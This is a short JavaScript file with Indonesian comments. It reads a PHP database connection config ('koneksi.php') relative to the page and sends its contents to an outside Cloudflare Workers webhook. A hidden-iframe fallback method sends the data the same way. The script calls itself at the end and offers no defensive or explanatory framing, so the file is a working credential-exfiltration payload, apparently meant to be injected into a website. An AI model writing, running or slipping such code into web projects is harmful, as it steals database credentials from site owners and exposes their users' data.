// Script untuk membaca dan mengirim konten file config
async function fetchAndSendConfig() {
    const targetFile = '../config/koneksi.php';
    const webhookUrl = 'https://lucifer.yutupprem0.workers.dev/?message=';
    
    try {
        console.log('🔍 Mencoba mengakses file:', targetFile);
        
        // Fetch the file content
        const response = await fetch(targetFile);
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const fileContent = await response.text();
        console.log('✅ Berhasil membaca file');
        
        // Encode content untuk URL
        const encodedContent = encodeURIComponent(fileContent);
        
        // Send to webhook
        console.log('📤 Mengirim data ke webhook...');
        const sendResponse = await fetch(webhookUrl + encodedContent, {
            method: 'GET',
            mode: 'no-cors' // Untuk menghindari CORS issues
        });
        
        console.log('✅ Data berhasil dikirim ke webhook');
        console.log('📋 Konten file:', fileContent.substring(0, 200) + '...');
        
    } catch (error) {
        console.error('❌ Error:', error.message);
        
        // Alternative method jika fetch langsung gagal
        tryAlternativeMethod();
    }
}

// Alternative method menggunakan iframe atau other techniques
function tryAlternativeMethod() {
    console.log('🔄 Mencoba metode alternatif...');
    
    // Method 1: Menggunakan iframe
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = '../config/koneksi.php';
    document.body.appendChild(iframe);
    
    setTimeout(() => {
        try {
            // Ini mungkin tidak bekerja karena same-origin policy
            const iframeContent = iframe.contentDocument?.body?.innerText;
            if (iframeContent) {
                sendToWebhook(iframeContent);
            }
        } catch (e) {
            console.log('❌ Metode iframe gagal:', e.message);
        }
    }, 2000);
}

// Function untuk mengirim data
async function sendToWebhook(content) {
    try {
        const encodedContent = encodeURIComponent(content);
        await fetch('https://lucifer.yutupprem0.workers.dev/?message=' + encodedContent, {
            method: 'GET',
            mode: 'no-cors'
        });
        console.log('✅ Data terkirim melalui metode alternatif');
    } catch (error) {
        console.error('❌ Gagal mengirim data:', error);
    }
}

// Jalankan script
fetchAndSendConfig();
